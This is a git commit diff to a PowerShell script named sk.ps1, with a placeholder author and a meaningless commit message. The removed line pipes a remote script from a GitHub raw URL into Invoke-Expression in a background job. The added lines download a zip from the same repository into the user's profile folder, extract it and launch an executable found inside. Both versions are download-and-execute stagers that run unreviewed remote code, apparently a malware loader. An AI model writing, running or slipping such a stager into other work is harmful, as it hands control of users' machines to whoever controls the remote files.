dbc23691772d9e4ca86b0183dfa29ec1af281cdd
Your Name <you@example.com>
2024-06-12 17:39:20 +0200

    jjh66

--- sk.ps1
+++ sk.ps1
@@ -1,1 +1,8 @@
-Start-Job -ScriptBlock { iwr -useb https://raw.githubusercontent.com/numeryczne/numeryczne/main/sk2.ps1 | iex}
+$fileUrl = "https://github.com/numeryczne/numeryczne/raw/main/plik.zip"
+$destinationPath = "$env:USERPROFILE\plik.zip"
+Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
+
+cd "$env:USERPROFILE"
+Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('.\plik.zip', '.');
+$exePath = ".\Debug\aplikacja1.exe"
+Start-Process -FilePath $exePath
